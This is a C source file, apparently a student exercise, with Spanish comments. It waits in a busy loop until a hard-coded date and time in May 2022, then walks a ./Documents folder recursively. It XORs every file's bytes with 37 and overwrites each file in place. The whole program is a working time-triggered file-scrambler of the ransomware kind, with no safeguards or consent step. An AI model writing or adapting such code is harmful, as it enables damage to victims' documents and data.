#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <dirent.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>

void leeArchivo(struct dirent *, char path[600]);
void recorrerDirectorio(DIR *, char [600]);

int main(){
    	DIR *dirtrabajo;
	time_t t;
	struct tm tm, hora;
	char path[600];
	
	//Conseguimos hora y fecha
	t = time (NULL);
	tm = *localtime(&t);
	
	hora.tm_year = 122;
	hora.tm_mon = 4;
	hora.tm_mday = 22;
	hora.tm_hour = 8;
	hora.tm_min = 24;
	hora.tm_sec = 0;
	
	while(tm.tm_year != hora.tm_year || tm.tm_mon != hora.tm_mon || tm.tm_mday != hora.tm_mday || tm.tm_hour != hora.tm_hour || tm.tm_min != hora.tm_min || tm.tm_sec != hora.tm_sec){
		t = time (NULL);
		tm = *localtime(&t);
	}

	printf("now: %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
	
	sprintf(path, "./Documents");
	printf("\n%s\n", path);
	dirtrabajo=opendir(path);
	printf("\nInformacion Directorio\n");
	printf("%p", dirtrabajo);
	printf("----------------------------");
	recorrerDirectorio(dirtrabajo, path);
//	printf("Sale del while");
	closedir(dirtrabajo);
	
	return EXIT_SUCCESS;
}

void  recorrerDirectorio(DIR *dirtrabajo, char path[600]){
	struct dirent *InfoDir;
	DIR *dirtrabajo2 = dirtrabajo;
	char ruta2[600];
	sprintf(ruta2, "%s", path);
	while((InfoDir=readdir(dirtrabajo))!=NULL)
	{
		if(InfoDir->d_type == DT_DIR)
		{
			if (strcmp(InfoDir->d_name, "..") != 0){
				if(strcmp(InfoDir->d_name, ".") != 0){
					sprintf(ruta2, "%s/%s", path, InfoDir->d_name);
					printf("\n%s\n", ruta2);
					dirtrabajo2=opendir(ruta2);
					recorrerDirectorio(dirtrabajo2, ruta2);
					closedir(dirtrabajo2);
					printf("\nDespues de recursividad%s\n", ruta2);
				}
			}
		}
		else
		{
			sprintf(ruta2, "%s", path);
			printf("\nElse = %s\n", ruta2);
			leeArchivo(InfoDir, ruta2);
			//printf("encontre archivo");
		}
	}
}

void leeArchivo(struct dirent *InfoDir, char path[600]){
		struct stat InfoFile;
		long int descriptorFile;
		ssize_t i;
		char ruta[600];
		puts("-------------------------------");
		if (strcmp(InfoDir->d_name, "..") != 0){
			if(strcmp(InfoDir->d_name, ".") != 0){
				printf("\nEl nombre de la entrada es:%s\n",InfoDir->d_name);
				printf("Archivo de tipo: %d\n", InfoDir->d_type);
	        		//sprintf(ruta,"./Documents/%s",InfoDir->d_name);
	        		sprintf(ruta, "%s/%s", path, InfoDir->d_name);
	        		printf("\n%s\n", ruta);
				descriptorFile=open(ruta, O_RDONLY);
				stat(ruta, &InfoFile);
				printf("\nTamano en bytes del archivo: %ld\n",InfoFile.st_size);
				unsigned char tamano[InfoFile.st_size];
//		printf("%d\n", sizeof(tamano));
			        i=read(descriptorFile, tamano, InfoFile.st_size);
//        printf("\nNo pude escribir en el archivo: %s\n",strerror(errno));
				//puts(tamano);
			        printf("\nCaracteres leidos %ld\n", i);
		     	        close(descriptorFile);
		/*for(i=0;i<InfoFile.st_size;i++){
			tamano[i]=tamano[i]^37;
		}
		printf("\nCadena encriptada: %s\n", tamano);*/
				for(i=0;i<InfoFile.st_size;i++){
					tamano[i]=tamano[i]^37;
				}
				printf("\nCadena encriptada: %s\n", tamano);
				descriptorFile=open(ruta, O_WRONLY | O_TRUNC);
				i=write(descriptorFile, tamano, sizeof(tamano));
				printf("\n\n\nCaracteres escritos: %ld\n", i);
				close(descriptorFile);
			}
		}
}
